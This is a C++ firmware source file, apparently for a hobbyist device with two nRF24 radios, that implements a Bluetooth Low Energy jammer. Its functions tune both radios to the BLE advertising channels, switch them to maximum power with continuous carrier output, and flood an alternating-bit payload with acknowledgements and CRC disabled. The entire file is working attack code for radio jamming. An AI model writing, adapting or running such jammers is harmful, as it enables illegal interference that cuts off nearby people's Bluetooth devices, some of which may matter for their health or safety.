#include "attacks/blejam.h"
#include "utils/display.h"

const uint8_t BLE_ADV_TO_NRF[] = {2, 26, 80};
#define BLE_ADV_COUNT (sizeof(BLE_ADV_TO_NRF) / sizeof(BLE_ADV_TO_NRF[0]))

uint8_t jammer_payload[32];

void init_blejammer()
{
    for (uint8_t i = 0; i < sizeof(jammer_payload); i++)
        jammer_payload[i] = (i & 1) ? 0x55 : 0xAA;
}

void configure_tx(RF24 &r)
{
    r.setAutoAck(false);
    r.setRetries(0, 0);
    r.setDataRate(RF24_2MBPS);
    r.setCRCLength(RF24_CRC_DISABLED);
    r.setAddressWidth(5);
    r.setPayloadSize(sizeof(jammer_payload));
    r.stopListening();         // TX mode
    r.setPALevel(RF24_PA_MIN); // start quiet, bump at jam time
}

void start_blejam()
{
    radio.rf1.setPALevel(RF24_PA_MAX);
    radio.rf1.setChannel(BLE_ADV_TO_NRF[0]);
    radio.rf1.testCarrier();
    delay(200);

    radio.rf2.setPALevel(RF24_PA_MAX);
    radio.rf2.setChannel(BLE_ADV_TO_NRF[1]);
    radio.rf2.testCarrier();
    delay(200);

    display.clearDisplay();
    display.setCursor(0, 15);
    display.println(F("BLEJAM..."));
    display.display();
}

void stop_blejam()
{
    radio.rf1.setPALevel(RF24_PA_MIN);
    radio.rf2.setPALevel(RF24_PA_MIN);
}

void perform_blejam()
{
    for (uint8_t i = 0; i < BLE_ADV_COUNT; i += 2)
    {
        uint8_t nrf1 = BLE_ADV_TO_NRF[i];
        uint8_t nrf2 = BLE_ADV_TO_NRF[(i + 1) % BLE_ADV_COUNT];

        radio.rf1.setChannel(nrf1);
        radio.rf2.setChannel(nrf2);

        radio.rf1.writeFast(jammer_payload, sizeof(jammer_payload));
        radio.rf2.writeFast(jammer_payload, sizeof(jammer_payload));
    }
}
